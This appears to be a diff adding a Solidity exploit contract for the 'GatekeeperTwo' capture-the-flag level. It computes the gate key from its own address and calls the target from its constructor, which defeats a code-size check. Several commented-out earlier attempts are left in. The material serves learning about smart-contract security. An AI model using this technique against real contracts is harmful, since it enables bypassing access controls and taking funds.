@@ -1,0 +1,38 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+//import './GatekeeperTwo.sol';
+
+interface IGatekeeperTwo {
+    function enter(bytes8 _gateKey) external  returns (bool) ;
+}
+
+contract AttackGatekeeperTwo {
+    IGatekeeperTwo public victim;
+    //GatekeeperTwo public victim;
+    //bool public entrantResult;
+    bool public passed=false;
+
+    constructor (address _gkAddr) {
+        bytes8 _key;
+        //victim =  GatekeeperTwo(_gkAddr);
+        //uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^  uint64(0) - 1 == uint64(_gateKey)
+        //bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1);
+        victim = IGatekeeperTwo(_gkAddr);
+        //bytes8 _key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) -1 );
+
+        //_key = bytes8((uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0)) -1 );
+        _key = bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xFFFFFFFFFFFFFFFF;
+
+        //_addr.call(abi.encodeWithSignature('enter(bytes8)',_key));
+        //entrantResult=victim.enter(_key);
+
+        (passed,)=_gkAddr.call(abi.encodeWithSignature('enter(bytes8)',_key));
+        
+        //passed = victim.enter(_key);
+
+
+    }
+
+
+
+}
